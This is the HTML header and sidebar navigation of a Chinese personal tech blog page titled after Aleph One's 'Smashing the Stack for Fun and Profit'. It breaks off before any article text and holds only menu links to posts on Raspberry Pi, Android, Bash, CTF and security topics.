<!doctype html><html lang=zh class=no-js> <head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link href=http://vjob.top/other/Smashing%20the%20Stack%20for%20Fun%20and%20Profit%20by%20Aleph%20One/ rel=canonical><link rel=icon href=../../assets/images/favicon.png><meta name=generator content="mkdocs-1.2.3, mkdocs-material-8.2.1"><title>Smashing the Stack for Fun and Profit by Aleph One - 微站</title><link rel=stylesheet href=../../assets/stylesheets/main.e8d9bf0c.min.css><link rel=stylesheet href=../../assets/stylesheets/palette.e6a45f82.min.css><meta name=theme-color content=#ffffff><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=stylesheet href="https://fonts.googleapis.com/css?family=Noto+Sans:300,400,400i,700%7CSource+Code+Pro&display=fallback"><style>:root{--md-text-font:"Noto Sans";--md-code-font:"Source Code Pro"}</style><script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script></head> <body dir=ltr data-md-color-scheme=preference data-md-color-primary=white data-md-color-accent=red> <input class=md-toggle data-md-toggle=drawer type=checkbox id=__drawer autocomplete=off> <input class=md-toggle data-md-toggle=search type=checkbox id=__search autocomplete=off> <label class=md-overlay for=__drawer></label> <div data-md-component=skip> <a href=#smashing-the-stack-for-fun-and-profit-by-aleph-one class=md-skip> 跳转至 </a> </div> <div data-md-component=announce> </div> <header class="md-header md-header--lifted" data-md-component=header> <nav class="md-header__inner md-grid" aria-label=页眉> <a href=../.. title=微站 class="md-header__button md-logo" aria-label=微站 data-md-component=logo> <img src=../../img/avatar.png alt=logo> </a> <label class="md-header__button md-icon" for=__drawer> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg> </label> <div class=md-header__title data-md-component=header-title> <div class=md-header__ellipsis> <div class=md-header__topic> <span class=md-ellipsis> 微站 </span> </div> <div class=md-header__topic data-md-component=header-topic> <span class=md-ellipsis> Smashing the Stack for Fun and Profit by Aleph One </span> </div> </div> </div> <label class="md-header__button md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> </label> <div class=md-search data-md-component=search role=dialog> <label class=md-search__overlay for=__search></label> <div class=md-search__inner role=search> <form class=md-search__form name=search> <input type=text class=md-search__input name=query aria-label=搜索 placeholder=搜索 autocapitalize=off autocorrect=off autocomplete=off spellcheck=false data-md-component=search-query required> <label class="md-search__icon md-icon" for=__search> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg> </label> <nav class=md-search__options aria-label=查找> <a href=javascript:void(0) class="md-search__icon md-icon" aria-label=分享 data-clipboard data-clipboard-text data-md-component=search-share tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08z"/></svg> </a> <button type=reset class="md-search__icon md-icon" aria-label=清空当前内容 tabindex=-1> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg> </button> </nav> <div class=md-search__suggest data-md-component=search-suggest></div> </form> <div class=md-search__output> <div class=md-search__scrollwrap data-md-scrollfix> <div class=md-search-result data-md-component=search-result> <div class=md-search-result__meta> 正在初始化搜索引擎 </div> <ol class=md-search-result__list></ol> </div> </div> </div> </div> </div> </nav> <nav class=md-tabs aria-label=标签 data-md-component=tabs> <div class="md-tabs__inner md-grid"> <ul class=md-tabs__list> <li class=md-tabs__item> <a href=../.. class=md-tabs__link> 主页 </a> </li> <li class=md-tabs__item> <a href=../../RPI/Cloudflare%20Tunnel%E9%85%8D%E7%BD%AE%E5%A4%9A%E4%B8%AA%E5%9F%9F%E5%90%8D/ class=md-tabs__link> 树莓派 </a> </li> <li class=md-tabs__item> <a href=../../Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/ class=md-tabs__link> Android </a> </li> <li class=md-tabs__item> <a href=../../Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/ class=md-tabs__link> Bash </a> </li> <li class=md-tabs__item> <a href=../CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/ class="md-tabs__link md-tabs__link--active"> 安全 </a> </li> <li class=md-tabs__item> <a href=../../CTF/MapleCTF2022_brsaby/ class=md-tabs__link> CTF </a> </li> <li class=md-tabs__item> <a href=../../%E5%8A%9F%E9%98%B2%E4%B8%96%E7%95%8C/misc_%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%902/ class=md-tabs__link> 功防世界 </a> </li> <li class=md-tabs__item> <a href=../How%20to%20Get%20Rich/ class=md-tabs__link> 其它 </a> </li> </ul> </div> </nav> </header> <div class=md-container data-md-component=container> <main class=md-main data-md-component=main> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component=sidebar data-md-type=navigation> <div class=md-sidebar__scrollwrap> <div class=md-sidebar__inner> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label=导航栏 data-md-level=0> <label class=md-nav__title for=__drawer> <a href=../.. title=微站 class="md-nav__button md-logo" aria-label=微站 data-md-component=logo> <img src=../../img/avatar.png alt=logo> </a> 微站 </label> <ul class=md-nav__list data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_1 type=checkbox id=__nav_1> <label class=md-nav__link for=__nav_1> 主页 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=主页 data-md-level=1> <label class=md-nav__title for=__nav_1> <span class="md-nav__icon md-icon"></span> 主页 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../.. class=md-nav__link> 微站 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/ class=md-nav__link> 树莓派 </a> </li> <li class=md-nav__item> <a href=../../Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/ class=md-nav__link> Android </a> </li> <li class=md-nav__item> <a href=../../Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/ class=md-nav__link> Bash </a> </li> <li class=md-nav__item> <a href=../../Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/ class=md-nav__link> 安全 </a> </li> <li class=md-nav__item> <a href=../How%20to%20Get%20Rich/ class=md-nav__link> 其它 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_2 type=checkbox id=__nav_2> <label class=md-nav__link for=__nav_2> 树莓派 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=树莓派 data-md-level=1> <label class=md-nav__title for=__nav_2> <span class="md-nav__icon md-icon"></span> 树莓派 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../RPI/Cloudflare%20Tunnel%E9%85%8D%E7%BD%AE%E5%A4%9A%E4%B8%AA%E5%9F%9F%E5%90%8D/ class=md-nav__link> Cloudflare Tunnel配置多个域名 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BEUbuntu-Mate%E9%85%8D%E7%BD%AEDNS%E8%A7%A3%E6%9E%90/ class=md-nav__link> Ubuntu配置DNS解析 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/ class=md-nav__link> 树莓派安装Ubuntu mate15.10 系统笔记 machh的专栏 CSDN博客 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8%E6%A0%91%E8%8E%93%E6%B4%BE%EF%BC%93B/ class=md-nav__link> 硬盘启动树莓派３B </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85JDK/ class=md-nav__link> 树莓派安装JDK </a> </li> <li class=md-nav__item> <a href=../../RPI/%E5%B0%86%E6%A0%91%E8%8E%93%E6%B4%BERaspberry%20Pi%E8%AE%BE%E7%BD%AE%E4%B8%BA%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%28WiFi%E7%83%AD%E7%82%B9AP%2CRTL8188CUS%E8%8A%AF%E7%89%87%29/ class=md-nav__link> 将树莓派Raspberry Pi设置为无线路由器(WiFi热点AP,RTL8188CUS芯片) </a> </li> <li class=md-nav__item> <a href=../../RPI/Using%20Raspberry%20Pi%20for%20Laravel%20developing/ class=md-nav__link> Using Raspberry Pi for Laravel developing </a> </li> <li class=md-nav__item> <a href=../../RPI/VNC%20setup%20on%20Raspberry%20Pi%20from%20Ubuntu/ class=md-nav__link> VNC setup on Raspberry Pi from Ubuntu </a> </li> <li class=md-nav__item> <a href=../../RPI/%E8%AE%BE%E7%BD%AE%E6%A0%91%E8%8E%93%E6%B4%BE%E4%BD%BF%E7%94%A8%E5%A4%96%E7%BD%AE%E7%A1%AC%E7%9B%98%E5%90%AF%E5%8A%A8/ class=md-nav__link> 设置树莓派使用外置硬盘启动 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%8A%8A%E6%A0%91%E8%8E%93%E6%B4%BE%E5%8F%98%E6%88%9024%E5%B0%8F%E6%97%B6%E8%BF%90%E8%A1%8C%E7%9A%84%E4%B8%8B%E8%BD%BD%E7%A5%9E%E5%99%A8%EF%BC%88%E7%A7%8D%E5%AD%90%E3%80%81%E7%A3%81%E5%8A%9B%E9%93%BE%E9%80%9A%E9%80%9A%E6%94%AF%E6%8C%81%EF%BC%89/ class=md-nav__link> 把树莓派变成24小时运行的下载神器（种子、磁力链通通支持） </a> </li> <li class=md-nav__item> <a href=../../RPI/%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE2%E4%B8%8A%E5%AE%89%E8%A3%85%20Chromium%20%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8F%8A%20Google%20%E6%8B%BC%E9%9F%B3%E8%BE%93%E5%85%A5%E6%B3%95/ class=md-nav__link> 在树莓派2上安装 Chromium 浏览器及 Google 拼音输入法 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E4%B8%BA%E6%A0%91%E8%8E%93%E6%B4%BEDIY%E4%B8%80%E6%AC%BE%E9%AB%98%E9%80%9F%E7%A8%B3%E5%AE%9A%E7%9A%84%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1/ class=md-nav__link> 为树莓派DIY一款高速稳定的无线网卡 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B6%E2%80%94%E2%80%94%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9_%E8%80%81%E5%BE%902014-CSDN%E5%8D%9A%E5%AE%A2_%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9/ class=md-nav__link> 树莓派开发系列教程6——树莓派做wifi热点 老徐2014 CSDN博客 树莓派做wifi热点 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BEwifi%E7%A0%B4%E8%A7%A3%E6%95%B4%E7%90%86%20-%20FindHao/ class=md-nav__link> 树莓派wifi破解整理 FindHao </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E9%A6%99%E6%A9%99%E6%B4%BE%E6%97%A0%E7%BA%BF%E6%92%AD%E6%94%BE%EF%BC%8C%E5%AE%9E%E7%8E%B0DLNA%E4%B8%8EAirPlay%E5%8D%8F%E8%AE%AE%E6%97%A0%E7%BA%BF%E9%9F%B3%E7%AE%B1/ class=md-nav__link> 树莓派香橙派无线播放，实现DLNA与AirPlay协议无线音箱 </a> </li> <li class=md-nav__item> <a href=../../RPI/SSH%E9%80%9A%E8%BF%87%E4%BB%A3%E7%90%86%E8%BF%9E%E6%8E%A5/ class=md-nav__link> SSH通过代理连接 </a> </li> <li class=md-nav__item> <a href=../../RPI/Autossh%20and%20Systemd%20Service/ class=md-nav__link> Autossh and Systemd Service </a> </li> <li class=md-nav__item> <a href=../../RPI/Copying%20MySQL%20Databases%20to%20Another%20Machine/ class=md-nav__link> Copying MySQL Databases to Another Machine </a> </li> <li class=md-nav__item> <a href=../../RPI/How%20To%20Move%20a%20MySQL%20Data%20Directory%20to%20a%20New%20Location%20on%20Ubuntu%2016.04/ class=md-nav__link> How To Move a MySQL Data Directory to a New Location on Ubuntu 16.04 </a> </li> <li class=md-nav__item> <a href=../../RPI/Latest%20Version%20of%20Firefox%20and%20Thunderbird%20on%20a%20Raspberry%20Pi%20%5Bobsolete%5D/ class=md-nav__link> Latest Version of Firefox and Thunderbird on a Raspberry Pi [obsolete] </a> </li> <li class=md-nav__item> <a href=../../RPI/OpenWrt%20%E4%BD%BF%E7%94%A8%20frp%20%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C%20%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%20%E6%96%87%E7%AB%A0%E8%AF%84%E8%AE%BA/ class=md-nav__link> OpenWrt 使用 frp 实现内网穿透 准备工作 搭建内网穿透 文章评论 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E8%A7%A3%E5%86%B3%E6%A0%91%E8%8E%93%E6%B4%BESSH%E7%99%BB%E5%BD%95%E7%BC%93%E6%85%A2%E7%9A%84%E9%97%AE%E9%A2%98_Maoning%20Guan%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2/ class=md-nav__link> 解决树莓派SSH登录缓慢的问题 Maoning Guan的博客 CSDN博客 </a> </li> <li class=md-nav__item> <a href=../../RPI/Reading%20privileged%20memory%20with%20a%20side-channel/ class=md-nav__link> Reading privileged memory with a side channel </a> </li> <li class=md-nav__item> <a href=../../RPI/Install%20Latest%20ReadyMedia%20miniDLNA%20Raspberry%20Pi/ class=md-nav__link> Install Latest ReadyMedia miniDLNA Raspberry Pi </a> </li> <li class=md-nav__item> <a href=../../RPI/%E4%BD%BF%E7%94%A8%20vcgencmd%20%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%20Raspberry%20Pi%20%E7%9A%84%20CPU%20%E6%BA%AB%E5%BA%A6%E3%80%81%E9%81%8B%E8%A1%8C%E9%80%9F%E5%BA%A6%E8%88%87%E9%9B%BB%E5%A3%93%E7%AD%89%E8%B3%87%E8%A8%8A/ class=md-nav__link> 使用 vcgencmd 指令查看 Raspberry Pi 的 CPU 溫度、運行速度與電壓等資訊 </a> </li> <li class=md-nav__item> <a href=../../RPI/Aria2%20%E7%BC%96%E8%AF%91%20%E6%B7%BB%E5%8A%A0%E6%94%AF%E6%8C%81BT%E4%B8%8B%E8%BD%BD%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%88X86%E5%92%8Carmhf%E7%9A%84%E6%A0%91%E8%8E%93%E6%B4%BE2%EF%BC%89/ class=md-nav__link> Aria2 编译 添加支持BT下载的功能（X86和armhf的树莓派2） </a> </li> <li class=md-nav__item> <a href=../../RPI/Let%27s%20Encrypt%EF%BC%8C%E5%85%8D%E8%B4%B9%E5%A5%BD%E7%94%A8%E7%9A%84%20HTTPS%20%E8%AF%81%E4%B9%A6/ class=md-nav__link> Let's Encrypt，免费好用的 HTTPS 证书 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/ class=md-nav__link> 使用SSH反向隧道进行内网穿透 </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/ class=md-nav__link> 树莓派利用nginx反向代理，成为IPv6 IPv4公网服务器（需要远程双栈服务器） </a> </li> <li class=md-nav__item> <a href=../../RPI/%E5%A6%82%E4%BD%95%E5%9C%A8%E6%A0%91%E8%8E%93%E6%B4%BE%E4%B8%8A%E6%90%AD%E5%BB%BA%20WordPress/ class=md-nav__link> 如何在树莓派上搭建 WordPress </a> </li> <li class=md-nav__item> <a href=../../RPI/Install%20Redis%20on%20your%20Raspberry%20Pi/ class=md-nav__link> Install Redis on your Raspberry Pi </a> </li> <li class=md-nav__item> <a href=../../RPI/%E6%A0%91%E8%8E%93%E6%B4%BE4%E5%8F%98%E8%BA%AB%E6%97%81%E8%B7%AF%E7%94%B1/ class=md-nav__link> 树莓派4变身旁路由 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_3 type=checkbox id=__nav_3> <label class=md-nav__link for=__nav_3> Android <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Android data-md-level=1> <label class=md-nav__title for=__nav_3> <span class="md-nav__icon md-icon"></span> Android </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../Android/Android10%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD/ class=md-nav__link> Android10源码下载 </a> </li> <li class=md-nav__item> <a href=../../Android/%E5%B1%8F%E5%B9%95%E5%9D%8F%E4%B8%80%E5%8A%A0%E6%89%8B%E6%9C%BA%E5%88%B7android10/ class=md-nav__link> 屏幕坏一加手机刷android10 </a> </li> <li class=md-nav__item> <a href=../../Android/Enable%20ADB%20from%20recovery/ class=md-nav__link> Enable ADB from recovery </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90%E5%92%8Croot%E6%9D%83%E9%99%90/ class=md-nav__link> Android系统权限和root权限 </a> </li> <li class=md-nav__item> <a href=../../Android/%E3%80%90Android%20ROM%E5%AE%9A%E5%88%B6%E3%80%91CyanogenMod%E6%BA%90%E7%A0%81%E4%B8%8B%E8%BD%BD%E5%92%8C%E7%BC%96%E8%AF%91/ class=md-nav__link> 【Android ROM定制】CyanogenMod源码下载和编译 </a> </li> <li class=md-nav__item> <a href=../../Android/%E6%97%A5%E7%A7%AF%E6%9C%88%E7%B4%AF%EF%BC%9AProguard%E8%BF%9B%E8%A1%8C%E6%BA%90%E4%BB%A3%E7%A0%81%E6%B7%B7%E6%B7%86%E5%92%8C%E5%B4%A9%E6%BA%83%E6%97%A5%E5%BF%97%E5%8F%8D%E6%B7%B7%E6%B7%86/ class=md-nav__link> 日积月累：Proguard进行源代码混淆和崩溃日志反混淆 </a> </li> <li class=md-nav__item> <a href=../../Android/10%20Ways%20to%20Improve%20Your%20Android%20App%27s%20Performance/ class=md-nav__link> 10 Ways to Improve Your Android App's Performance </a> </li> <li class=md-nav__item> <a href=../../Android/Anatomy%20of%20RecyclerView%3Aa%20Search%20for%20a%20ViewHolder/ class=md-nav__link> Anatomy of RecyclerView:a Search for a ViewHolder </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E6%8F%92%E4%BB%B6%E5%8C%96%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%E2%80%94%E2%80%94Hook%E6%9C%BA%E5%88%B6%E4%B9%8BBinder%20Hook/ class=md-nav__link> Android插件化原理解析——Hook机制之Binder Hook </a> </li> <li class=md-nav__item> <a href=../../Android/%E6%89%8B%E6%8A%8A%E6%89%8B%E6%95%99%E4%BD%A0%E5%BD%93%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E7%AC%AC%E4%B8%80%E5%90%8D%E2%80%93%E5%88%A9%E7%94%A8AndroidHook%E8%BF%9B%E8%A1%8C%E5%BE%AE%E4%BF%A1%E8%BF%90%E5%8A%A8%E4%BD%9C%E5%BC%8A/ class=md-nav__link> 手把手教你当微信运动第一名–利用AndroidHook进行微信运动作弊 </a> </li> <li class=md-nav__item> <a href=../../Android/Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93%20Android%20%E5%8A%A8%E7%94%BB%E6%80%BB%E7%BB%93/ class=md-nav__link> Android 动画总结 Android 动画总结 </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E7%AD%BE%E5%90%8D%E6%80%BB%E7%BB%93/ class=md-nav__link> Android签名总结 </a> </li> <li class=md-nav__item> <a href=../../Android/Am%E5%91%BD%E4%BB%A4%E7%94%A8%E6%B3%95/ class=md-nav__link> Am命令用法 </a> </li> <li class=md-nav__item> <a href=../../Android/10%20Tips%20for%20using%20the%20Eclipse%20Memory%20Analyzer/ class=md-nav__link> 10 Tips for using the Eclipse Memory Analyzer </a> </li> <li class=md-nav__item> <a href=../../Android/android%E4%BD%BF%E7%94%A8ndk-stack%E8%B0%83%E8%AF%95JNI%E9%83%A8%E5%88%86%E7%9A%84C_C%2B%2B%E4%BB%A3%E7%A0%81/ class=md-nav__link> android使用ndk stack调试JNI部分的C C++代码 </a> </li> <li class=md-nav__item> <a href=../../Android/NativeActivity%E5%8E%9F%E7%90%86/ class=md-nav__link> NativeActivity原理 </a> </li> <li class=md-nav__item> <a href=../../Android/Using%20data%20binding%20in%20Android/ class=md-nav__link> Using data binding in Android </a> </li> <li class=md-nav__item> <a href=../../Android/Android%E4%B8%8AWebRTC%E4%BB%8B%E7%BB%8D/ class=md-nav__link> Android上WebRTC介绍 </a> </li> <li class=md-nav__item> <a href=../../Android/CoordinatorLayout%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95-%E8%87%AA%E5%AE%9A%E4%B9%89Behavior/ class=md-nav__link> CoordinatorLayout高级用法 自定义Behavior </a> </li> <li class=md-nav__item> <a href=../../Android/OpenSSL%E5%AE%9E%E8%B7%B5-Android%E4%B8%8B%E7%9A%84%E7%BC%96%E8%AF%91%E5%92%8C%E4%BD%BF%E7%94%A8/ class=md-nav__link> OpenSSL实践 Android下的编译和使用 </a> </li> <li class=md-nav__item> <a href=../../Android/%E4%BD%BF%E7%94%A8ShareSDK%E5%AE%8C%E6%88%90%E7%AC%AC%E4%B8%89%E6%96%B9%EF%BC%88QQ%E3%80%81%E5%BE%AE%E4%BF%A1%E3%80%81%E5%BE%AE%E5%8D%9A%EF%BC%89%E7%99%BB%E5%BD%95%E5%92%8C%E5%88%86%E4%BA%AB/ class=md-nav__link> 使用ShareSDK完成第三方（QQ、微信、微博）登录和分享 </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_4 type=checkbox id=__nav_4> <label class=md-nav__link for=__nav_4> Bash <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=Bash data-md-level=1> <label class=md-nav__title for=__nav_4> <span class="md-nav__icon md-icon"></span> Bash </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../../Bash/%E5%BA%94%E8%AF%A5%E7%9F%A5%E9%81%93%E7%9A%84Linux%E6%8A%80%E5%B7%A7/ class=md-nav__link> 应该知道的Linux技巧 </a> </li> <li class=md-nav__item> <a href=../../Bash/%E4%BC%98%E9%9B%85%E5%9C%B0%E4%BD%BF%E7%94%A8%E5%91%BD%E4%BB%A4%E8%A1%8C%EF%BC%9ATmux%20%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8/ class=md-nav__link> 优雅地使用命令行：Tmux 终端复用 </a> </li> <li class=md-nav__item> <a href=../../Bash/%E6%88%91%E7%9A%84ImageMagick%E4%BD%BF%E7%94%A8%E5%BF%83%E5%BE%97/ class=md-nav__link> 我的ImageMagick使用心得 </a> </li> <li class=md-nav__item> <a href=../../Bash/gdbcomm/ class=md-nav__link> Gdbcomm </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--active md-nav__item--nested"> <input class="md-nav__toggle md-toggle" data-md-toggle=__nav_5 type=checkbox id=__nav_5 checked> <label class=md-nav__link for=__nav_5> 安全 <span class="md-nav__icon md-icon"></span> </label> <nav class=md-nav aria-label=安全 data-md-level=1> <label class=md-nav__title for=__nav_5> <span class="md-nav__icon md-icon"></span> 安全 </label> <ul class=md-nav__list data-md-scrollfix> <li class=md-nav__item> <a href=../CTF%E5%B8%B8%E7%94%A8%E8%A7%A3%E5%AF%86%E8%84%9A%E6%9C%AC/ class=md-nav__link> CTF常用解密脚本 </a> </li> <li class=md-nav__item> <a href=../CTF%E5%B8%B8%E7%94%A8RSA%E6%8A%80%E5%B7%A7/ class=md-nav__link> CTF常用RSA技巧 </a> </li> <li class=md-nav__item> <a href=../CTF%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/ class=md-nav__link> CTF中的序列化与反序列化 </a> </li> <li class=md-nav__item> <a href=../RSA/ class=md-nav__link> RSA </a> </li> <li class=md-nav__item> <a href=../SageMath%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/ class=md-nav__link> SageMath常用函数 </a> </li> <li class=md-nav__item> <a href=../../Android/Mobile%20Application%20Penetration%20Testing%20Cheat%20sheet%20with%20Tools%20%26%20Resources/ class=md-nav__link> Mobile Application Penetration Testing Cheat sheet with Tools & Resources </a> </li> <li class=md-nav__item> <a href=../Most%20Important%20Network%20Penetration%20Testing%20Tools%20for%20Hackers%20%26%20Security%20Professionals/ class=md-nav__link> Most Important Network Penetration Testing Tools for Hackers & Security Professionals </a> </li> <li class=md-nav__item> <a href=../%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%AE%9E%E9%AA%8C/ class=md-nav__link> 缓冲区溢出攻击实验 </a> </li> <li class=md-nav__item> <a href=../%E5%B7%A7%E7%94%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/ class=md-nav__link> 巧用命令注入的N种方式 </a> </li> <li class="md-nav__item md-nav__item--active"> <input class="md-nav__toggle md-toggle" data-md-toggle=toc type=checkbox id=__toc> <label class="md-nav__link md-nav__link--active" for=__toc> Smashing the Stack for Fun and Profit by Aleph One <span class="md-nav__icon md-icon"></span> </label> <a href=./ class="md-nav__link md-nav__link--active"> Smashing the Stack for Fun and Profit by Aleph One </a> <nav class="md-nav md-nav--secondary" aria-label=目录> <label class=md-nav__title for=__toc> <span class="md-nav__icon md-icon"></span> 目录 </label> <ul class=md-nav__list data-md-component=toc data-md-scrollfix> <li class=md-nav__item> <a href=#smashing-the-stack-for-fun-and-profit-by-aleph-one class=md-nav__link> Smashing the Stack for Fun and Profit by Aleph One </a> </li> </ul> </nav> </li> <li class=md-nav__item> <a href=../../Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/ class=md-nav__link> Bad Binder:Android In The Wild Exploit </a> </li> <li class=md-nav__item> <a 